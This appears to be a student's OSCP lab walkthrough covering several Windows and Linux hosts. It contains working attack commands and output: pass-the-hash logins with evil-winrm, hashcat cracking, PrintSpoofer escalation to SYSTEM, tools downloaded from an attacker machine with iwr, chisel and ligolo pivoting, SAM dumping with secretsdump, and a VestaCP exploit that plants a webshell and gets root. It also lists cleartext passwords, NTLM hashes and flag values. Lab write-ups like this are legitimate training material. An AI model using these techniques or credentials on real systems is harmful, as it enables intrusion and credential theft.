
#### Credentials


#### User
celia.almdea
Marry.Williams
web_svc
support

#### Password


#### Flags
.155 - local and proof (standalone)
.156 - local and proof (standalone)
.157 - local and proof (standalone)

.152 - proof only (domain joined - DC01)
.153 - NONE (domain joined - MS01)
.154 - NONE (domain joined - MS02)


#### 152
1. Nmap 
```
PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   open   domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy
```

2. Login and get proof.txt
```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.115.140 -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
f35a0bde6a9db9dcf29b1ea7394b212b
```

#### 153
1. Rustscan
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ rustscan 192.168.210.153

PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
5040/tcp  open  unknown      syn-ack
5985/tcp  open  wsman        syn-ack
8000/tcp  open  http-alt     syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack
49671/tcp open  unknown      syn-ack
```

2. Nmap 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ nmap -p$(cat 153-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.210.153 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 02:23 EST
Nmap scan report for 192.168.210.153
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: TRACE
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-21T07:25:57
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.28 seconds
```

3. Directory search with feroxbuster. Found user 'support' hash with found subdirectory. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ feroxbuster -u http://192.168.210.153:8000/

http://192.168.210.153:8000/Partner/db
```

4. Cracking it and Ssh login 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ hashcat -m 0 support.hash /usr/share/wordlists/rockyou.txt --force

26231162520c611ccabfb18b5ae4dff2:Freedom1  


┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ ssh support@192.168.210.153

support@MS01 C:\Users\support>whoami                              
ms01\support 
```

5. Found 'admintool.exe' and cracked password for administrator and ssh login 
```
PS C:\Users\support> .\admintool.exe id
Enter administrator password:

thread 'main' panicked at 'assertion failed: `(left == right)`
  left: `"d41d8cd98f00b204e9800998ecf8427e"`,
 right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', src/main.rs:78:5 
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
PS C:\Users\support>

┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ hashcat -m 0 right.hash /usr/share/wordlists/rockyou.txt --force

05f8ba9f047f799adbea95a16de2ef5d:December31 

┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ ssh administrator@192.168.210.153

administrator@MS01 C:\Users\Administrator>whoami
ms01\administrator
```

6. Privilege escalation
```
PS C:\Users>  iwr -uri http://192.168.45.242/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
PS C:\Users> .\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
nt authority\system
```

7. Post-exploitation. Found the administrator password in the history. 

8. Chisel setup 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ ./chisel-l server -p 8081 --reverse
2024/02/21 04:38:37 server: Reverse tunnelling enabled
2024/02/21 04:38:37 server: Fingerprint 90A3TFErzWoT1wDS68JyAAIWeR9FSs=
2024/02/21 04:38:37 server: Listening on http://0.0.0.0:8081
2024/02/21 04:39:08 server: session#1: tun: proxy#R:127.0.0.: Listening


PS C:\Users> .\chisel.exe client 192.168.45.242:8081 R:1080:socks
2024/02/21 01:39:05 client: Connecting to ws://192.168.45.242:8081
2024/02/21 01:39:08 client: Connected (Latency 311.128ms)

```

9. Ligolo setup - for transferring file to 154
```
ligolo-ng » INFO[0021] Agent joined.                                 name="MS01\\Administrator@MS01" remote="192.168.210.153:51635"
ligolo-ng » session
? Specify a session : 1 - #1 - MS01\Administrator@MS01 - 192.168.210.153:51635
[Agent : MS01\Administrator@MS01] »


[Agent : MS01\Administrator@MS01] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
INFO[0101] Listener 0 created on remote agent! 


┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.210.153 - - [21/Feb/2024 04:31:26] "GET /winagent.exe HTTP/1.1" 2

PS C:\Users\Administrator\Desktop> iwr -uri http://10.10.100.153:1234/mimikatz.exe -Outfile mimikatz.exe
```

#### 154
1. Nmap
```
PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  open   msrpc
139/tcp  open   netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  open   microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy
```

2. Evil winrm login with administrator account. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ evil-winrm -i 10.10.100.154 -u 'Administrator' -p 'hghgib6vHT3bVWf' 
```

3. Since, Mimikatz didnot dump any hashes so, download sam and system files. 
```
*Evil-WinRM* PS C:\windows.old\windows\system32> download C:\windows.old\Windows\System32\SAM /home/kali/SAM1
                                        
Info: Downloading C:\windows.old\Windows\System32\SAM to /home/kali/SAM1
                                        
Info: Download successful!

*Evil-WinRM* PS C:\windows.old\windows\system32> download C:\windows.old\Windows\System32\SYSTEM /home/kali/SYSTEM1
                                        
Info: Downloading C:\windows.old\Windows\System32\SYSTEM to /home/kali/SYSTEM1
                                        
Info: Download successful!
```

4. Dump hashes. 
```
┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump -sam SAM1 -system SYSTEM1 LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 

```

#### 156
1. Rustscan
```
PORT     STATE SERVICE     REASON
21/tcp   open  ftp         syn-ack
22/tcp   open  ssh         syn-ack
25/tcp   open  smtp        syn-ack
53/tcp   open  domain      syn-ack
80/tcp   open  http        syn-ack
110/tcp  open  pop3        syn-ack
143/tcp  open  imap        syn-ack
465/tcp  open  smtps       syn-ack
587/tcp  open  submission  syn-ack
993/tcp  open  imaps       syn-ack
995/tcp  open  pop3s       syn-ack
2525/tcp open  ms-v-worlds syn-ack
3306/tcp open  mysql       syn-ack
8080/tcp open  http-proxy  syn-ack
8083/tcp open  us-srv      syn-ack
8443/tcp open  https-alt   syn-ack
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ nmap -p$(cat 156-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.210.156
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 06:57 EST
Nmap scan report for 192.168.210.156
Host is up (0.31s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)
|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)
|_  256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)
25/tcp   open  smtp     Exim smtpd 4.90_1
|_ssl-date: 2024-02-21T11:57:31+00:00; -48s from scanner time.
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.242], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
80/tcp   open  http     nginx
|_http-title: oscp.exam &mdash; Coming Soon
| http-methods: 
|_  Potentially risky methods: TRACE
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_pop3-capabilities: STLS CAPA AUTH-RESP-CODE RESP-CODES TOP USER SASL(PLAIN LOGIN) UIDL PIPELINING
|_ssl-date: TLS randomness does not represent time
143/tcp  open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_imap-capabilities: capabilities LITERAL+ Pre-login have post-login ID OK IMAP4rev1 more listed ENABLE IDLE AUTH=PLAIN SASL-IR LOGIN-REFERRALS AUTH=LOGINA0001 STARTTLS
|_ssl-date: TLS randomness does not represent time
465/tcp  open  ssl/smtp Exim smtpd 4.90_1
|_ssl-date: 2024-02-21T11:57:12+00:00; -1m04s from scanner time.
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.242], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
587/tcp  open  smtp     Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.242], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2024-02-21T11:57:49+00:00; -29s from scanner time.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: post-login capabilities AUTH=PLAIN OK ID LITERAL+ IMAP4rev1 have Pre-login listed IDLE AUTH=LOGINA0001 SASL-IR LOGIN-REFERRALS ENABLE more
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN LOGIN) USER UIDL CAPA AUTH-RESP-CODE TOP RESP-CODES PIPELINING
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
2525/tcp open  smtp     Exim smtpd 4.90_1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.242], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2024-02-21T11:57:36+00:00; -43s from scanner time.
|_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug)
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-11-08T08:15:37
|_Not valid after:  2032-11-05T08:15:37
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40-0ubuntu0.18.04.1
|   Thread ID: 125
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, Speaks41ProtocolOld, FoundRows, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, InteractiveClient, ConnectWithDatabase, SupportsTransactions, LongPassword, ODBCClient, LongColumnFlag, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: >"3<^C{'q5'UN8;_D^>4
|_  Auth Plugin Name: mysql_native_password
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: oscp.exam &mdash; Coming Soon
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.210.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
Service Info: Host: oscp.exam; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -46s, deviation: 14s, median: -48s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.98 seconds
```

3. Tried different ways, and finally found vulnerable web at 8083. 

4. Since snmp was open so checked its logs. Obtained user jack credentails. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ snmpwalk -v2c -c public 192.168.210.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password-cmd" = STRING: /bin/echo
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password" = STRING: -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password-cmd" = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password-cmd" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password-cmd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password-cmd" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password-cmd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password-cmd" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password-cmd" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password-cmd" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password" = INTEGER: 256
NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password-cmd" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password".1 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password-cmd".1 = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd

```

5. Download public exploit. 
```
[SSD Advisory – VestaCP Multiple Vulnerabilities - SSD Secure Disclosure (ssd-disclosure.com)](https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/)

Downloaded last three scripts, placed them same place directory, also creaded VestaFuncs folder and placed vestaFuncs.py inside it as init.py
```

6. Run the exploit 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpc]
└─$ python ./vestaROOT.py https://192.168.210.156:8083 Jack 3PUKsX98BMupBiCf
[+] Logged in as Jack
[!] fept3o9dgm.poc not found, creating one...
[+] fept3o9dgm.poc added
[+] fept3o9dgm.poc found, looking up webshell
[!] webshell not found, creating one..
[+] Webshell uploaded
[!] Mail domain not found, creating one..
[+] Mail domain created
[+] Mail account created
[+] root shell possibly obtained
# id
uid=0(root) gid=0(root) groups=0(root)
```

7. Obtained local.txt and proof.txt
```
root@oscp:/home/Jack# cat local.txt
cat local.txt
aa494711abf4b4f1d951cdcade9a384e
root@oscp:/home/Jack# cd /root
cd /root
root@oscp:/root# cat proof.txt
cat proof.txt
74ccb0851385a25cfd5c75800189bf7b
```

#### 157



#### 158



